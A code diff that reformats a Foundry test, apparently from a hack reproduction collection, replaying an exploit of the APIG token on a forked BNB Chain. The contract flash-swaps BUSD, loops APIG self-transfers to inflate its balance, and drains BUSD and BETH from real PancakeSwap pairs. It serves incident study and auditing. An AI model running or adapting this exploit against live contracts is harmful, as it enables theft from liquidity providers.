@@ -14,34 +14,31 @@ import "./interface.sol";
 // Twitter Guy : https://twitter.com/CertiKAlert/status/1700128158647734745
 // Hacking God : https://www.google.com/
 
-
 interface IBEP20 {
-  function totalSupply() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
 
-  function decimals() external view returns (uint8);
+    function decimals() external view returns (uint8);
 
-  function symbol() external view returns (string memory);
+    function symbol() external view returns (string memory);
 
-  function name() external view returns (string memory);
+    function name() external view returns (string memory);
 
-  function getOwner() external view returns (address);
+    function getOwner() external view returns (address);
 
-  function balanceOf(address account) external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
 
-  function transfer(address recipient, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
 
-  function allowance(address _owner, address spender) external view returns (uint256);
+    function allowance(address _owner, address spender) external view returns (uint256);
 
-  function approve(address spender, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
 
-  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
-  event Transfer(address indexed from, address indexed to, uint256 value);
+    event Transfer(address indexed from, address indexed to, uint256 value);
 
-  event Approval(address indexed owner, address indexed spender, uint256 value);
-
+    event Approval(address indexed owner, address indexed spender, uint256 value);
 }
-
 
 contract ContractTest is Test {
     IPancakePair aDaDPair = IPancakePair(0xaDaD973f8920bc511d94aade2762284f621F1467);
@@ -51,11 +48,11 @@ contract ContractTest is Test {
     IBEP20 BUSD = IBEP20(0x55d398326f99059fF775485246999027B3197955);
     IBEP20 BETH = IBEP20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
     IBEP20 APIG = IBEP20(0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888);
-    uint amount = 500_000_000_000_000_000_000;
+    uint256 amount = 500_000_000_000_000_000_000;
     address[] path = new address[](2);
 
     function setUp() public {
-        vm.createSelectFork("bsc", 31562012 - 1);
+        vm.createSelectFork("bsc", 31_562_012 - 1);
         vm.label(address(aDaDPair), "0xadad_Pair");
         vm.label(address(EfBfPair), "0xefbf_Pair");
         vm.label(address(b920Pair), "0xb920_Pair");
@@ -65,44 +62,43 @@ contract ContractTest is Test {
         vm.label(address(APIG), "APIG");
     }
 
-    function testExploit() external{
-        uint startBUSD = BUSD.balanceOf(address(this));
+    function testExploit() external {
+        uint256 startBUSD = BUSD.balanceOf(address(this));
         // console.log("Before Start: %d USD", startBUSD);
         aDaDPair.swap(amount, 0, address(this), abi.encode(amount));
 
-        uint expBUSD = BUSD.balanceOf(address(this)) - startBUSD;
-        uint intRes_USD = expBUSD/1 ether;
-        uint decRes_USD =  expBUSD - intRes_USD * 1e18;
+        uint256 expBUSD = BUSD.balanceOf(address(this)) - startBUSD;
+        uint256 intRes_USD = expBUSD / 1 ether;
+        uint256 decRes_USD = expBUSD - intRes_USD * 1e18;
         console.log("Attack Exploit: %s.%s USD", intRes_USD, decRes_USD);
-        uint intRes_ETH =  BETH.balanceOf(address(this))/1 ether;
-        uint decRes_ETH =  BETH.balanceOf(address(this)) - intRes_ETH * 1e18;
+        uint256 intRes_ETH = BETH.balanceOf(address(this)) / 1 ether;
+        uint256 decRes_ETH = BETH.balanceOf(address(this)) - intRes_ETH * 1e18;
         console.log("Attack Exploit: %s.%s ETH", intRes_ETH, decRes_ETH);
     }
 
-    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         BUSD.transfer(address(EfBfPair), amount);
         (path[0], path[1]) = (address(BUSD), address(APIG));
         uint256[] memory swapAmounts = router.getAmountsOut(amount, path);
         EfBfPair.swap(0, swapAmounts[1], address(this), "");
-        uint256 amount72628 = BUSD.balanceOf(address(EfBfPair))-5e19;
+        uint256 amount72628 = BUSD.balanceOf(address(EfBfPair)) - 5e19;
         (path[0], path[1]) = (address(APIG), address(BUSD));
         uint256[] memory APIG_BUSD = router.getAmountsIn(amount72628, path);
-        uint256 amount59500 = BETH.balanceOf(address(b920Pair))-1e17;
-         (path[0], path[1]) = (address(APIG), address(BETH));
+        uint256 amount59500 = BETH.balanceOf(address(b920Pair)) - 1e17;
+        (path[0], path[1]) = (address(APIG), address(BETH));
         uint256[] memory APIG_BETH = router.getAmountsIn(amount59500, path);
-        while(true){
-            uint transferAmount = APIG.balanceOf(address(this));
+        while (true) {
+            uint256 transferAmount = APIG.balanceOf(address(this));
             APIG.transfer(address(this), transferAmount);
-            if (transferAmount >= 257_947_240_540_223_703_649_846_558_720){
+            if (transferAmount >= 257_947_240_540_223_703_649_846_558_720) {
                 break;
             }
         }
 
-        APIG.transfer(address(EfBfPair), APIG_BUSD[0] + APIG_BUSD[0]/100*4);
+        APIG.transfer(address(EfBfPair), APIG_BUSD[0] + APIG_BUSD[0] / 100 * 4);
         EfBfPair.swap(amount72628, 0, address(this), "");
-        BUSD.transfer(address(aDaDPair), amount + amount/100*3);
-        APIG.transfer(address(b920Pair),APIG.balanceOf(address(this)));
+        BUSD.transfer(address(aDaDPair), amount + amount / 100 * 3);
+        APIG.transfer(address(b920Pair), APIG.balanceOf(address(this)));
         b920Pair.swap(amount59500, 0, address(this), "");
     }
-
 }
